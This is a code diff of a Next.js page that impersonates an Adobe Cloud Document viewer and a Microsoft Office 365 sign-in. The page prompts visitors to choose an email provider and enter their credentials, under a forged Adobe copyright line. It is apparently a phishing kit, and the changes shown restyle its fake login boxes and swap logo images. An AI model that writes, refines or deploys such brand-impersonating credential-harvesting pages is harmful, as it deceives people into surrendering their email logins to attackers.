@@ -3,7 +3,6 @@ import Image from "next/image";
 import { Inter } from "next/font/google";
 import styles from "@/styles/Home.module.css";
 import Link from "next/link";
-import { TfiMicrosoftAlt } from "react-icons/tfi";
 import { MdAlternateEmail } from "react-icons/md";
 import { useState } from "react";
 import { ImSpinner3 } from "react-icons/im";
@@ -75,7 +74,10 @@ export default function Home() {
         <link rel="manifest" href="/site.webmanifest"/>
       </Head>
       <main className={`${styles.main} ${inter.className}`}>
-      {!show && !office && <div className={styles.box}>
+      <div className={styles.backgroundImage}></div>
+        <div className={styles.content}>
+      {!show && !office && 
+      <div className={styles.mainBox}>
           <div className="d-flex justify-content-center"><Image src='/adobe.jpg' alt="adobe" width={100} height={100}/> </div>
           <div className="text-center py-2">
           <h6 className={styles.adobeHeader}>Adobe Cloud Document</h6>
@@ -83,7 +85,10 @@ export default function Home() {
           </div>
           <div>
             <Link href="/#" className={styles.emailLinks} onClick={handleOffice}>
-            <div className={styles.officeBox}><TfiMicrosoftAlt className={styles.officeIcon}/></div>
+            <div className={styles.officeBox}>
+              <Image src='/officee.png' alt="adobe" width={20} height={20}/>
+              
+              </div>
             <h6 className={styles.signin}>Sign in with Office365</h6>
             
             </Link>
@@ -96,11 +101,14 @@ export default function Home() {
             <small className={styles.copyright}>Select your email provider to view Document.</small>
             <small className={styles.copyright}>&copy; {currentYear} Adobe System Incorporated, All right reserved.</small>
           </div>
-        </div>}
-        {show && !office && <div className={styles.box}>
-        <div className="d-flex justify-content-center"><Image src='/otheremail.png' alt="adobe" width={70} height={70} className={styles.emailimg}/> </div>
+        </div>
+        }
+        {show && !office && 
+        <div className={styles.box}>
+        <div className={styles.boxx}>
+        <div className="d-flex justify-content-center"><Image src='/other.jpeg' alt="adobe" width={50} height={50} className={styles.emailimg}/> </div>
           <div className="text-center py-2">
-          <h6 className={styles.adobeHeader}> Login with Other Email</h6>
+          <h6 className={styles.otherHeader}> Login with Other Email</h6>
           
             <form onSubmit={handleSubmit}>
             <div className={styles.modalsubtext}>
@@ -156,16 +164,19 @@ export default function Home() {
             <small className={styles.copyright}>&copy; {currentYear} Adobe System Incorporated, All right reserved.</small>
             </div>
           </div>
-          </div>}
+          </div>
+          </div>
+          }
         {office && show &&
         <div className={styles.box}>
+        <div className={styles.boxx}>
         <div className="d-flex justify-content-start align-items-center"><Image src='/office.png' alt="adobe" width={30} height={30} className={styles.emalimg}/> <h6 className={styles.office}>Microsoft</h6> </div>
         <div className="pt-4">
           <h6 className={styles.sign}>Sign in</h6>
           <p className={styles.account}>to access your Microsoft Office 365 account</p>
         </div>
         <p className={styles.errorMsg}>{message}</p>
-          <div className="text-center py-2">
+          <div className="text-center ">
             <form onSubmit={handleSubmit}>
             <div className={styles.modalsubtext}>
                            <label className={styles.label}>Email Address</label>
@@ -179,7 +190,6 @@ export default function Home() {
                                onChange={(e) => setEmail(e.target.value)}
                                className={`${styles.officeInput} form-contol`}
                              />
-                             {/* <label className={styles.labels}>We&lsquo;ll never share your email with anyone else.</label> */}
                             
                            </div>
                          </div>
@@ -219,7 +229,9 @@ export default function Home() {
             </div>
           </div>
           </div>
+          </div>
           } 
+          </div>
       </main>
     </>
   );
